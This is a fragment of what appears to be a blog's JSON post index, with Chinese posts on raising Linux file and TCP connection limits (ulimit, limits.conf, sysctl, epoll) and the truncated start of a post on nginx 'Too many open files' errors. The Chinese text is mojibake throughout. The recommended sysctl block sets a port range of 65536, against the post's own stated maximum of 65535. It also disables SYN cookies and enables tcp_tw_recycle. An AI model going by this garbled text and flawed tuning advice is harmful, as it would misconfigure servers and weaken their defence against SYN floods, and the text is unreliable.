¹æ®ç³»ç»Ÿç¡¬ä»¶èµ„æºçŠ¶å†µ(ä¸»è¦æ˜¯ç³»ç»Ÿå†…å­˜)è®¡ç®—å‡ºæ¥çš„ç³»ç»Ÿæœ€å¤šå¯åŒæ—¶æ‰“å¼€çš„æ–‡ä»¶æ•°é‡ã€‚é€šå¸¸è½¯é™åˆ¶å°äºæˆ–ç­‰äºç¡¬é™åˆ¶ã€‚ä¿®æ”¹ä¸Šè¿°é™åˆ¶çš„æœ€ç®€å•çš„åŠæ³•å°±æ˜¯ä½¿ç”¨ulimitå‘½ä»¤ï¼š$ ulimit -nä¸Šè¿°å‘½ä»¤ä¸­ï¼Œåœ¨ä¸­æŒ‡å®šè¦è®¾ç½®çš„å•ä¸€è¿›ç¨‹å…è®¸æ‰“å¼€çš„æœ€å¤§æ–‡ä»¶æ•°ã€‚å¦‚æœç³»ç»Ÿå›æ˜¾ç±»ä¼¼äºâ€œOperation notpermittedâ€ä¹‹ç±»çš„è¯ï¼Œè¯´æ˜ä¸Šè¿°é™åˆ¶ä¿®æ”¹å¤±è´¥ï¼Œå®é™…ä¸Šæ˜¯å› ä¸ºåœ¨ä¸­æŒ‡å®šçš„æ•°å€¼è¶…è¿‡äº†Linuxç³»ç»Ÿå¯¹è¯¥ç”¨æˆ·æ‰“å¼€æ–‡ä»¶æ•°çš„è½¯é™åˆ¶æˆ–ç¡¬é™åˆ¶ã€‚å› æ­¤ï¼Œå°±éœ€è¦ä¿®æ”¹Linuxç³»ç»Ÿå¯¹ç”¨æˆ·çš„å…³äºæ‰“å¼€æ–‡ä»¶æ•°çš„è½¯é™åˆ¶å’Œç¡¬é™åˆ¶ã€‚ç¬¬ä¸€æ­¥ï¼Œä¿®æ”¹/etc/security/limits.confæ–‡ä»¶ï¼Œåœ¨æ–‡ä»¶ä¸­æ·»åŠ å¦‚ä¸‹è¡Œï¼šspeng soft nofile 10240speng hard nofile 10240å…¶ä¸­spengæŒ‡å®šäº†è¦ä¿®æ”¹å“ªä¸ªç”¨æˆ·çš„æ‰“å¼€æ–‡ä»¶æ•°é™åˆ¶ï¼Œå¯ç”¨â€™*'å·è¡¨ç¤ºä¿®æ”¹æ‰€æœ‰ç”¨æˆ·çš„é™åˆ¶ï¼›softæˆ–hardæŒ‡å®šè¦ä¿®æ”¹è½¯é™åˆ¶è¿˜æ˜¯ç¡¬é™åˆ¶ï¼›10240åˆ™æŒ‡å®šäº†æƒ³è¦ä¿®æ”¹çš„æ–°çš„é™åˆ¶å€¼ï¼Œå³æœ€å¤§æ‰“å¼€æ–‡ä»¶æ•°(è¯·æ³¨æ„è½¯é™åˆ¶å€¼è¦å°äºæˆ–ç­‰äºç¡¬é™åˆ¶)ã€‚ä¿®æ”¹å®Œåä¿å­˜æ–‡ä»¶ã€‚ç¬¬äºŒæ­¥ï¼Œä¿®æ”¹/etc/pam.d/loginæ–‡ä»¶ï¼Œåœ¨æ–‡ä»¶ä¸­æ·»åŠ å¦‚ä¸‹è¡Œï¼šsession required /lib/security/pam_limits.soè¿™æ˜¯å‘Šè¯‰Linuxåœ¨ç”¨æˆ·å®Œæˆç³»ç»Ÿç™»å½•åï¼Œåº”è¯¥è°ƒç”¨pam_limits.soæ¨¡å—æ¥è®¾ç½®ç³»ç»Ÿå¯¹è¯¥ç”¨æˆ·å¯ä½¿ç”¨çš„å„ç§èµ„æºæ•°é‡çš„æœ€å¤§é™åˆ¶(åŒ…æ‹¬ç”¨æˆ·å¯æ‰“å¼€çš„æœ€å¤§æ–‡ä»¶æ•°é™åˆ¶)ï¼Œè€Œpam_limits.soæ¨¡å—å°±ä¼šä»/etc/security/limits.confæ–‡ä»¶ä¸­è¯»å–é…ç½®æ¥è®¾ç½®è¿™äº›é™åˆ¶å€¼ã€‚ä¿®æ”¹å®Œåä¿å­˜æ­¤æ–‡ä»¶ã€‚ç¬¬ä¸‰æ­¥ï¼ŒæŸ¥çœ‹Linuxç³»ç»Ÿçº§çš„æœ€å¤§æ‰“å¼€æ–‡ä»¶æ•°é™åˆ¶ï¼Œä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ï¼š$ cat /proc/sys/fs/file-max12158è¿™è¡¨æ˜è¿™å°Linuxç³»ç»Ÿæœ€å¤šå…è®¸åŒæ—¶æ‰“å¼€(å³åŒ…å«æ‰€æœ‰ç”¨æˆ·æ‰“å¼€æ–‡ä»¶æ•°æ€»å’Œ)12158ä¸ªæ–‡ä»¶ï¼Œæ˜¯Linuxç³»ç»Ÿçº§ç¡¬é™åˆ¶ï¼Œæ‰€æœ‰ç”¨æˆ·çº§çš„æ‰“å¼€æ–‡ä»¶æ•°é™åˆ¶éƒ½ä¸åº”è¶…è¿‡è¿™ä¸ªæ•°å€¼ã€‚é€šå¸¸è¿™ä¸ªç³»ç»Ÿçº§ç¡¬é™åˆ¶æ˜¯Linuxç³»ç»Ÿåœ¨å¯åŠ¨æ—¶æ ¹æ®ç³»ç»Ÿç¡¬ä»¶èµ„æºçŠ¶å†µè®¡ç®—å‡ºæ¥çš„æœ€ä½³çš„æœ€å¤§åŒæ—¶æ‰“å¼€æ–‡ä»¶æ•°é™åˆ¶ï¼Œå¦‚æœæ²¡æœ‰ç‰¹æ®Šéœ€è¦ï¼Œä¸åº”è¯¥ä¿®æ”¹æ­¤é™åˆ¶ï¼Œé™¤éæƒ³ä¸ºç”¨æˆ·çº§æ‰“å¼€æ–‡ä»¶æ•°é™åˆ¶è®¾ç½®è¶…è¿‡æ­¤é™åˆ¶çš„å€¼ã€‚ä¿®æ”¹æ­¤ç¡¬é™åˆ¶çš„æ–¹æ³•æ˜¯ä¿®æ”¹/etc/rc.localè„šæœ¬ï¼Œåœ¨è„šæœ¬ä¸­æ·»åŠ å¦‚ä¸‹è¡Œï¼šecho 22158 &gt; /proc/sys/fs/file-maxè¿™æ˜¯è®©Linuxåœ¨å¯åŠ¨å®Œæˆåå¼ºè¡Œå°†ç³»ç»Ÿçº§æ‰“å¼€æ–‡ä»¶æ•°ç¡¬é™åˆ¶è®¾ç½®ä¸º22158ã€‚ä¿®æ”¹å®Œåä¿å­˜æ­¤æ–‡ä»¶ã€‚å®Œæˆä¸Šè¿°æ­¥éª¤åé‡å¯ç³»ç»Ÿï¼Œä¸€èˆ¬æƒ…å†µä¸‹å°±å¯ä»¥å°†Linuxç³»ç»Ÿå¯¹æŒ‡å®šç”¨æˆ·çš„å•ä¸€è¿›ç¨‹å…è®¸åŒæ—¶æ‰“å¼€çš„æœ€å¤§æ–‡ä»¶æ•°é™åˆ¶è®¾ä¸ºæŒ‡å®šçš„æ•°å€¼ã€‚å¦‚æœé‡å¯åç”¨ ulimit-nå‘½ä»¤æŸ¥çœ‹ç”¨æˆ·å¯æ‰“å¼€æ–‡ä»¶æ•°é™åˆ¶ä»ç„¶ä½äºä¸Šè¿°æ­¥éª¤ä¸­è®¾ç½®çš„æœ€å¤§å€¼ï¼Œè¿™å¯èƒ½æ˜¯å› ä¸ºåœ¨ç”¨æˆ·ç™»å½•è„šæœ¬/etc/profileä¸­ä½¿ç”¨ulimit -nå‘½ä»¤å·²ç»å°†ç”¨æˆ·å¯åŒæ—¶æ‰“å¼€çš„æ–‡ä»¶æ•°åšäº†é™åˆ¶ã€‚ç”±äºé€šè¿‡ulimit-nä¿®æ”¹ç³»ç»Ÿå¯¹ç”¨æˆ·å¯åŒæ—¶æ‰“å¼€æ–‡ä»¶çš„æœ€å¤§æ•°é™åˆ¶æ—¶ï¼Œæ–°ä¿®æ”¹çš„å€¼åªèƒ½å°äºæˆ–ç­‰äºä¸Šæ¬¡ ulimit-nè®¾ç½®çš„å€¼ï¼Œå› æ­¤æƒ³ç”¨æ­¤å‘½ä»¤å¢å¤§è¿™ä¸ªé™åˆ¶å€¼æ˜¯ä¸å¯èƒ½çš„ã€‚æ‰€ä»¥ï¼Œå¦‚æœæœ‰ä¸Šè¿°é—®é¢˜å­˜åœ¨ï¼Œå°±åªèƒ½å»æ‰“å¼€/etc/profileè„šæœ¬æ–‡ä»¶ï¼Œåœ¨æ–‡ä»¶ä¸­æŸ¥æ‰¾æ˜¯å¦ä½¿ç”¨äº†ulimit-né™åˆ¶äº†ç”¨æˆ·å¯åŒæ—¶æ‰“å¼€çš„æœ€å¤§æ–‡ä»¶æ•°é‡ï¼Œå¦‚æœæ‰¾åˆ°ï¼Œåˆ™åˆ é™¤è¿™è¡Œå‘½ä»¤ï¼Œæˆ–è€…å°†å…¶è®¾ç½®çš„å€¼æ”¹ä¸ºåˆé€‚çš„å€¼ï¼Œç„¶åä¿å­˜æ–‡ä»¶ï¼Œç”¨æˆ·é€€å‡ºå¹¶é‡æ–°ç™»å½•ç³»ç»Ÿå³å¯ã€‚é€šè¿‡ä¸Šè¿°æ­¥éª¤ï¼Œå°±ä¸ºæ”¯æŒé«˜å¹¶å‘TCPè¿æ¥å¤„ç†çš„é€šè®¯å¤„ç†ç¨‹åºè§£é™¤å…³äºæ‰“å¼€æ–‡ä»¶æ•°é‡æ–¹é¢çš„ç³»ç»Ÿé™åˆ¶ã€‚2ã€ä¿®æ”¹ç½‘ç»œå†…æ ¸å¯¹TCPè¿æ¥çš„æœ‰å…³é™åˆ¶ï¼ˆå‚è€ƒå¯¹æ¯”ä¸‹ç¯‡æ–‡ç« â€œä¼˜åŒ–å†…æ ¸å‚æ•°â€ï¼‰åœ¨Linuxä¸Šç¼–å†™æ”¯æŒé«˜å¹¶å‘TCPè¿æ¥çš„å®¢æˆ·ç«¯é€šè®¯å¤„ç†ç¨‹åºæ—¶ï¼Œæœ‰æ—¶ä¼šå‘ç°å°½ç®¡å·²ç»è§£é™¤äº†ç³»ç»Ÿå¯¹ç”¨æˆ·åŒæ—¶æ‰“å¼€æ–‡ä»¶æ•°çš„é™åˆ¶ï¼Œä½†ä»ä¼šå‡ºç°å¹¶å‘TCPè¿æ¥æ•°å¢åŠ åˆ°ä¸€å®šæ•°é‡æ—¶ï¼Œå†ä¹Ÿæ— æ³•æˆåŠŸå»ºç«‹æ–°çš„TCPè¿æ¥çš„ç°è±¡ã€‚å‡ºç°è¿™ç§ç°åœ¨çš„åŸå› æœ‰å¤šç§ã€‚ç¬¬ä¸€ç§åŸå› å¯èƒ½æ˜¯å› ä¸ºLinuxç½‘ç»œå†…æ ¸å¯¹æœ¬åœ°ç«¯å£å·èŒƒå›´æœ‰é™åˆ¶ã€‚æ­¤æ—¶ï¼Œè¿›ä¸€æ­¥åˆ†æä¸ºä»€ä¹ˆæ— æ³•å»ºç«‹TCPè¿æ¥ï¼Œä¼šå‘ç°é—®é¢˜å‡ºåœ¨connect()è°ƒç”¨è¿”å›å¤±è´¥ï¼ŒæŸ¥çœ‹ç³»ç»Ÿé”™è¯¯æç¤ºæ¶ˆæ¯æ˜¯â€œCanâ€™t assign requestedaddressâ€ã€‚åŒæ—¶ï¼Œå¦‚æœåœ¨æ­¤æ—¶ç”¨tcpdumpå·¥å…·ç›‘è§†ç½‘ç»œï¼Œä¼šå‘ç°æ ¹æœ¬æ²¡æœ‰TCPè¿æ¥æ—¶å®¢æˆ·ç«¯å‘SYNåŒ…çš„ç½‘ç»œæµé‡ã€‚è¿™äº›æƒ…å†µè¯´æ˜é—®é¢˜åœ¨äºæœ¬åœ°Linuxç³»ç»Ÿå†…æ ¸ä¸­æœ‰é™åˆ¶ã€‚å…¶å®ï¼Œé—®é¢˜çš„æ ¹æœ¬åŸå› åœ¨äºLinuxå†…æ ¸çš„TCP/IPåè®®å®ç°æ¨¡å—å¯¹ç³»ç»Ÿä¸­æ‰€æœ‰çš„å®¢æˆ·ç«¯TCPè¿æ¥å¯¹åº”çš„æœ¬åœ°ç«¯å£å·çš„èŒƒå›´è¿›è¡Œäº†é™åˆ¶(ä¾‹å¦‚ï¼Œå†…æ ¸é™åˆ¶æœ¬åœ°ç«¯å£å·çš„èŒƒå›´ä¸º1024~32768ä¹‹é—´)ã€‚å½“ç³»ç»Ÿä¸­æŸä¸€æ—¶åˆ»åŒæ—¶å­˜åœ¨å¤ªå¤šçš„TCPå®¢æˆ·ç«¯è¿æ¥æ—¶ï¼Œç”±äºæ¯ä¸ªTCPå®¢æˆ·ç«¯è¿æ¥éƒ½è¦å ç”¨ä¸€ä¸ªå”¯ä¸€çš„æœ¬åœ°ç«¯å£å·(æ­¤ç«¯å£å·åœ¨ç³»ç»Ÿçš„æœ¬åœ°ç«¯å£å·èŒƒå›´é™åˆ¶ä¸­)ï¼Œå¦‚æœç°æœ‰çš„TCPå®¢æˆ·ç«¯è¿æ¥å·²å°†æ‰€æœ‰çš„æœ¬åœ°ç«¯å£å·å æ»¡ï¼Œåˆ™æ­¤æ—¶å°±æ— æ³•ä¸ºæ–°çš„TCPå®¢æˆ·ç«¯è¿æ¥åˆ†é…ä¸€ä¸ªæœ¬åœ°ç«¯å£å·äº†ï¼Œå› æ­¤ç³»ç»Ÿä¼šåœ¨è¿™ç§æƒ…å†µä¸‹åœ¨connect()è°ƒç”¨ä¸­è¿”å›å¤±è´¥ï¼Œå¹¶å°†é”™è¯¯æç¤ºæ¶ˆæ¯è®¾ä¸ºâ€œCanâ€™t assignrequested addressâ€ã€‚æœ‰å…³è¿™äº›æ§åˆ¶é€»è¾‘å¯ä»¥æŸ¥çœ‹Linuxå†…æ ¸æºä»£ç ï¼Œä»¥linux2.6å†…æ ¸ä¸ºä¾‹ï¼Œå¯ä»¥æŸ¥çœ‹tcp_ipv4.cæ–‡ä»¶ä¸­å¦‚ä¸‹å‡½æ•°ï¼šstatic int tcp_v4_hash_connect(struct sock *sk)è¯·æ³¨æ„ä¸Šè¿°å‡½æ•°ä¸­å¯¹å˜é‡sysctl_local_port_rangeçš„è®¿é—®æ§åˆ¶ã€‚å˜é‡sysctl_local_port_rangeçš„åˆå§‹åŒ–åˆ™æ˜¯åœ¨tcp.cæ–‡ä»¶ä¸­çš„å¦‚ä¸‹å‡½æ•°ä¸­è®¾ç½®ï¼švoid __init tcp_init(void)å†…æ ¸ç¼–è¯‘æ—¶é»˜è®¤è®¾ç½®çš„æœ¬åœ°ç«¯å£å·èŒƒå›´å¯èƒ½å¤ªå°ï¼Œå› æ­¤éœ€è¦ä¿®æ”¹æ­¤æœ¬åœ°ç«¯å£èŒƒå›´é™åˆ¶ã€‚ç¬¬ä¸€æ­¥ï¼Œä¿®æ”¹/etc/sysctl.confæ–‡ä»¶ï¼Œåœ¨æ–‡ä»¶ä¸­æ·»åŠ å¦‚ä¸‹è¡Œï¼šnet.ipv4.ip_local_port_range = 1024 65000è¿™è¡¨æ˜å°†ç³»ç»Ÿå¯¹æœ¬åœ°ç«¯å£èŒƒå›´é™åˆ¶è®¾ç½®ä¸º1024~65000ä¹‹é—´ã€‚è¯·æ³¨æ„ï¼Œæœ¬åœ°ç«¯å£èŒƒå›´çš„æœ€å°å€¼å¿…é¡»å¤§äºæˆ–ç­‰äº1024ï¼›è€Œç«¯å£èŒƒå›´çš„æœ€å¤§å€¼åˆ™åº”å°äºæˆ–ç­‰äº65535ã€‚ä¿®æ”¹å®Œåä¿å­˜æ­¤æ–‡ä»¶ã€‚ç¬¬äºŒæ­¥ï¼Œæ‰§è¡Œsysctlå‘½ä»¤ï¼š$ sysctl -på¦‚æœç³»ç»Ÿæ²¡æœ‰é”™è¯¯æç¤ºï¼Œå°±è¡¨æ˜æ–°çš„æœ¬åœ°ç«¯å£èŒƒå›´è®¾ç½®æˆåŠŸã€‚å¦‚æœæŒ‰ä¸Šè¿°ç«¯å£èŒƒå›´è¿›è¡Œè®¾ç½®ï¼Œåˆ™ç†è®ºä¸Šå•ç‹¬ä¸€ä¸ªè¿›ç¨‹æœ€å¤šå¯ä»¥åŒæ—¶å»ºç«‹60000å¤šä¸ªTCPå®¢æˆ·ç«¯è¿æ¥ã€‚ç¬¬äºŒç§æ— æ³•å»ºç«‹TCPè¿æ¥çš„åŸå› å¯èƒ½æ˜¯å› ä¸ºLinuxç½‘ç»œå†…æ ¸çš„IP_TABLEé˜²ç«å¢™å¯¹æœ€å¤§è·Ÿè¸ªçš„TCPè¿æ¥æ•°æœ‰é™åˆ¶ã€‚æ­¤æ—¶ç¨‹åºä¼šè¡¨ç°ä¸ºåœ¨ connect()è°ƒç”¨ä¸­é˜»å¡ï¼Œå¦‚åŒæ­»æœºï¼Œå¦‚æœç”¨tcpdumpå·¥å…·ç›‘è§†ç½‘ç»œï¼Œä¹Ÿä¼šå‘ç°æ ¹æœ¬æ²¡æœ‰TCPè¿æ¥æ—¶å®¢æˆ·ç«¯å‘SYNåŒ…çš„ç½‘ç»œæµé‡ã€‚ç”±äº IP_TABLEé˜²ç«å¢™åœ¨å†…æ ¸ä¸­ä¼šå¯¹æ¯ä¸ªTCPè¿æ¥çš„çŠ¶æ€è¿›è¡Œè·Ÿè¸ªï¼Œè·Ÿè¸ªä¿¡æ¯å°†ä¼šæ”¾åœ¨ä½äºå†…æ ¸å†…å­˜ä¸­çš„conntrackdatabaseä¸­ï¼Œè¿™ä¸ªæ•°æ®åº“çš„å¤§å°æœ‰é™ï¼Œå½“ç³»ç»Ÿä¸­å­˜åœ¨è¿‡å¤šçš„TCPè¿æ¥æ—¶ï¼Œæ•°æ®åº“å®¹é‡ä¸è¶³ï¼ŒIP_TABLEæ— æ³•ä¸ºæ–°çš„TCPè¿æ¥å»ºç«‹è·Ÿè¸ªä¿¡æ¯ï¼Œäºæ˜¯è¡¨ç°ä¸ºåœ¨connect()è°ƒç”¨ä¸­é˜»å¡ã€‚æ­¤æ—¶å°±å¿…é¡»ä¿®æ”¹å†…æ ¸å¯¹æœ€å¤§è·Ÿè¸ªçš„TCPè¿æ¥æ•°çš„é™åˆ¶ï¼Œæ–¹æ³•åŒä¿®æ”¹å†…æ ¸å¯¹æœ¬åœ°ç«¯å£å·èŒƒå›´çš„é™åˆ¶æ˜¯ç±»ä¼¼çš„ï¼šç¬¬ä¸€æ­¥ï¼Œä¿®æ”¹/etc/sysctl.confæ–‡ä»¶ï¼Œåœ¨æ–‡ä»¶ä¸­æ·»åŠ å¦‚ä¸‹è¡Œï¼šnet.ipv4.ip_conntrack_max = 10240è¿™è¡¨æ˜å°†ç³»ç»Ÿå¯¹æœ€å¤§è·Ÿè¸ªçš„TCPè¿æ¥æ•°é™åˆ¶è®¾ç½®ä¸º10240ã€‚è¯·æ³¨æ„ï¼Œæ­¤é™åˆ¶å€¼è¦å°½é‡å°ï¼Œä»¥èŠ‚çœå¯¹å†…æ ¸å†…å­˜çš„å ç”¨ã€‚ç¬¬äºŒæ­¥ï¼Œæ‰§è¡Œsysctlå‘½ä»¤ï¼š$ sysctl -på¦‚æœç³»ç»Ÿæ²¡æœ‰é”™è¯¯æç¤ºï¼Œå°±è¡¨æ˜ç³»ç»Ÿå¯¹æ–°çš„æœ€å¤§è·Ÿè¸ªçš„TCPè¿æ¥æ•°é™åˆ¶ä¿®æ”¹æˆåŠŸã€‚å¦‚æœæŒ‰ä¸Šè¿°å‚æ•°è¿›è¡Œè®¾ç½®ï¼Œåˆ™ç†è®ºä¸Šå•ç‹¬ä¸€ä¸ªè¿›ç¨‹æœ€å¤šå¯ä»¥åŒæ—¶å»ºç«‹10000å¤šä¸ªTCPå®¢æˆ·ç«¯è¿æ¥ã€‚3ã€ä½¿ç”¨æ”¯æŒé«˜å¹¶å‘ç½‘ç»œI/Oçš„ç¼–ç¨‹æŠ€æœ¯åœ¨Linuxä¸Šç¼–å†™é«˜å¹¶å‘TCPè¿æ¥åº”ç”¨ç¨‹åºæ—¶ï¼Œå¿…é¡»ä½¿ç”¨åˆé€‚çš„ç½‘ç»œI/OæŠ€æœ¯å’ŒI/Oäº‹ä»¶åˆ†æ´¾æœºåˆ¶ã€‚å¯ç”¨çš„I/OæŠ€æœ¯æœ‰åŒæ­¥I/Oï¼Œéé˜»å¡å¼åŒæ­¥I/O(ä¹Ÿç§°ååº”å¼I/O)ï¼Œä»¥åŠå¼‚æ­¥I/Oã€‚åœ¨é«˜TCPå¹¶å‘çš„æƒ…å½¢ä¸‹ï¼Œå¦‚æœä½¿ç”¨åŒæ­¥I/Oï¼Œè¿™ä¼šä¸¥é‡é˜»å¡ç¨‹åºçš„è¿è½¬ï¼Œé™¤éä¸ºæ¯ä¸ªTCPè¿æ¥çš„I/Oåˆ›å»ºä¸€ä¸ªçº¿ç¨‹ã€‚ä½†æ˜¯ï¼Œè¿‡å¤šçš„çº¿ç¨‹åˆä¼šå› ç³»ç»Ÿå¯¹çº¿ç¨‹çš„è°ƒåº¦é€ æˆå·¨å¤§å¼€é”€ã€‚å› æ­¤ï¼Œåœ¨é«˜TCPå¹¶å‘çš„æƒ…å½¢ä¸‹ä½¿ç”¨åŒæ­¥ I/Oæ˜¯ä¸å¯å–çš„ï¼Œè¿™æ—¶å¯ä»¥è€ƒè™‘ä½¿ç”¨éé˜»å¡å¼åŒæ­¥I/Oæˆ–å¼‚æ­¥I/Oã€‚éé˜»å¡å¼åŒæ­¥I/Oçš„æŠ€æœ¯åŒ…æ‹¬ä½¿ç”¨select()ï¼Œpoll()ï¼Œepollç­‰æœºåˆ¶ã€‚å¼‚æ­¥I/Oçš„æŠ€æœ¯å°±æ˜¯ä½¿ç”¨AIOã€‚ä»I/Oäº‹ä»¶åˆ†æ´¾æœºåˆ¶æ¥çœ‹ï¼Œä½¿ç”¨select()æ˜¯ä¸åˆé€‚çš„ï¼Œå› ä¸ºå®ƒæ‰€æ”¯æŒçš„å¹¶å‘è¿æ¥æ•°æœ‰é™(é€šå¸¸åœ¨1024ä¸ªä»¥å†…)ã€‚å¦‚æœè€ƒè™‘æ€§èƒ½ï¼Œpoll()ä¹Ÿæ˜¯ä¸åˆé€‚çš„ï¼Œå°½ç®¡å®ƒå¯ä»¥æ”¯æŒçš„è¾ƒé«˜çš„TCPå¹¶å‘æ•°ï¼Œä½†æ˜¯ç”±äºå…¶é‡‡ç”¨â€œè½®è¯¢â€æœºåˆ¶ï¼Œå½“å¹¶å‘æ•°è¾ƒé«˜æ—¶ï¼Œå…¶è¿è¡Œæ•ˆç‡ç›¸å½“ä½ï¼Œå¹¶å¯èƒ½å­˜åœ¨I/Oäº‹ä»¶åˆ†æ´¾ä¸å‡ï¼Œå¯¼è‡´éƒ¨åˆ†TCPè¿æ¥ä¸Šçš„I/Oå‡ºç°â€œé¥¥é¥¿â€ç°è±¡ã€‚è€Œå¦‚æœä½¿ç”¨epollæˆ–AIOï¼Œåˆ™æ²¡æœ‰ä¸Šè¿°é—®é¢˜(æ—©æœŸLinuxå†…æ ¸çš„AIOæŠ€æœ¯å®ç°æ˜¯é€šè¿‡åœ¨å†…æ ¸ä¸­ä¸ºæ¯ä¸ª I/Oè¯·æ±‚åˆ›å»ºä¸€ä¸ªçº¿ç¨‹æ¥å®ç°çš„ï¼Œè¿™ç§å®ç°æœºåˆ¶åœ¨é«˜å¹¶å‘TCPè¿æ¥çš„æƒ…å½¢ä¸‹ä½¿ç”¨å…¶å®ä¹Ÿæœ‰ä¸¥é‡çš„æ€§èƒ½é—®é¢˜ã€‚ä½†åœ¨æœ€æ–°çš„Linuxå†…æ ¸ä¸­ï¼ŒAIOçš„å®ç°å·²ç»å¾—åˆ°æ”¹è¿›)ã€‚ç»¼ä¸Šæ‰€è¿°ï¼Œåœ¨å¼€å‘æ”¯æŒé«˜å¹¶å‘TCPè¿æ¥çš„Linuxåº”ç”¨ç¨‹åºæ—¶ï¼Œåº”å°½é‡ä½¿ç”¨epollæˆ–AIOæŠ€æœ¯æ¥å®ç°å¹¶å‘çš„TCPè¿æ¥ä¸Šçš„I/Oæ§åˆ¶ï¼Œè¿™å°†ä¸ºæå‡ç¨‹åºå¯¹é«˜å¹¶å‘TCPè¿æ¥çš„æ”¯æŒæä¾›æœ‰æ•ˆçš„I/Oä¿è¯ã€‚å†…æ ¸å‚æ•°sysctl.confçš„ä¼˜åŒ–/etc/sysctl.conf æ˜¯ç”¨æ¥æ§åˆ¶linuxç½‘ç»œçš„é…ç½®æ–‡ä»¶ï¼Œå¯¹äºä¾èµ–ç½‘ç»œçš„ç¨‹åºï¼ˆå¦‚webæœåŠ¡å™¨å’ŒcacheæœåŠ¡å™¨ï¼‰éå¸¸é‡è¦ï¼ŒRHELé»˜è®¤æä¾›çš„æœ€å¥½è°ƒæ•´ã€‚æ¨èé…ç½®ï¼ˆæŠŠåŸ/etc/sysctl.confå†…å®¹æ¸…æ‰ï¼ŒæŠŠä¸‹é¢å†…å®¹å¤åˆ¶è¿›å»ï¼‰ï¼šnet.ipv4.ip_local_port_range = 1024 65536net.core.rmem_max=16777216net.core.wmem_max=16777216net.ipv4.tcp_rmem=4096 87380 16777216net.ipv4.tcp_wmem=4096 65536 16777216net.ipv4.tcp_fin_timeout = 10net.ipv4.tcp_tw_recycle = 1net.ipv4.tcp_timestamps = 0net.ipv4.tcp_window_scaling = 0net.ipv4.tcp_sack = 0net.core.netdev_max_backlog = 30000net.ipv4.tcp_no_metrics_save=1net.core.somaxconn = 262144net.ipv4.tcp_syncookies = 0net.ipv4.tcp_max_orphans = 262144net.ipv4.tcp_max_syn_backlog = 262144net.ipv4.tcp_synack_retries = 2net.ipv4.tcp_syn_retries = 2è¿™ä¸ªé…ç½®å‚è€ƒäºcacheæœåŠ¡å™¨varnishçš„æ¨èé…ç½®å’ŒSunOne æœåŠ¡å™¨ç³»ç»Ÿä¼˜åŒ–çš„æ¨èé…ç½®ã€‚varnishè°ƒä¼˜æ¨èé…ç½®çš„åœ°å€ä¸ºï¼šhttp://varnish.projects.linpro.no/wiki/Performanceä¸è¿‡varnishæ¨èçš„é…ç½®æ˜¯æœ‰é—®é¢˜çš„ï¼Œå®é™…è¿è¡Œè¡¨æ˜â€œnet.ipv4.tcp_fin_timeout = 3â€çš„é…ç½®ä¼šå¯¼è‡´é¡µé¢ç»å¸¸æ‰“ä¸å¼€ï¼›å¹¶ä¸”å½“ç½‘å‹ä½¿ç”¨çš„æ˜¯IE6æµè§ˆå™¨æ—¶ï¼Œè®¿é—®ç½‘ç«™ä¸€æ®µæ—¶é—´åï¼Œæ‰€æœ‰ç½‘é¡µéƒ½ä¼šæ‰“ä¸å¼€ï¼Œé‡å¯æµè§ˆå™¨åæ­£å¸¸ã€‚å¯èƒ½æ˜¯å›½å¤–çš„ç½‘é€Ÿå¿«å§ï¼Œæˆ‘ä»¬å›½æƒ…å†³å®šéœ€è¦è°ƒæ•´â€œnet.ipv4.tcp_fin_timeout = 10â€ï¼Œåœ¨10sçš„æƒ…å†µä¸‹ï¼Œä¸€åˆ‡æ­£å¸¸ï¼ˆå®é™…è¿è¡Œç»“è®ºï¼‰ã€‚ä¿®æ”¹å®Œæ¯•åï¼Œæ‰§è¡Œï¼š/sbin/sysctl -p /etc/sysctl.conf/sbin/sysctl -w net.ipv4.route.flush=1å‘½ä»¤ç”Ÿæ•ˆã€‚ä¸ºäº†ä¿é™©èµ·è§ï¼Œä¹Ÿå¯ä»¥rebootç³»ç»Ÿã€‚è°ƒæ•´æ–‡ä»¶æ•°ï¼šlinuxç³»ç»Ÿä¼˜åŒ–å®Œç½‘ç»œå¿…é¡»è°ƒé«˜ç³»ç»Ÿå…è®¸æ‰“å¼€çš„æ–‡ä»¶æ•°æ‰èƒ½æ”¯æŒå¤§çš„å¹¶å‘ï¼Œé»˜è®¤1024æ˜¯è¿œè¿œä¸å¤Ÿçš„ã€‚æ‰§è¡Œå‘½ä»¤ï¼šShellä»£ç echo ulimit -HSn 65536 &gt;&gt; /etc/rc.localecho ulimit -HSn 65536 &gt;&gt;/root/.bash_profileulimit -HSn 65536","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"å‹åŠ›æµ‹è¯•","slug":"å‹åŠ›æµ‹è¯•","permalink":"https://wangxiuwen.github.io/tags/%E5%8E%8B%E5%8A%9B%E6%B5%8B%E8%AF%95/"}],"author":"wangxiuwen"},{"title":"å‹åŠ›æµ‹è¯•ä¸­è¿æ¥æ•°è¿‡å¤§é—®é¢˜","slug":"history/tech/5953c4d0c2b92f5665eeda2d","date":"2016-04-11T23:07:22.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda2d/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda2d/","excerpt":"","text":"è§£å†³é—®é¢˜ï¼šnginx 2016/04/1217:14:19 5714#0: accept4() failed (24: Too many open files)è°ƒè¯•è¿æ¥æ•°ï¼š3603 2016/04/12 10:24:49 15757#0:1024 worker_connections are not enough&lt;o:p&gt;&lt;/o:p&gt;3604 2016/04/12 10:24:49 15757#0: 1024 worker_connections are not enough3605 2016/04/12 10:24:49 15757#0: 1024 worker_connections are not enough3606 2016/04/12 10:24:49 15757#0: 1024 worker_connections are not enough3607 2016/04/12 10:24:49 15757#0: 1024 worker_connections are not enoughæœ€å¤§æ–‡ä»¶æ•°ä¿®æ”¹ç­‰worker_rlimit_nofile 65535;events {worker_connections 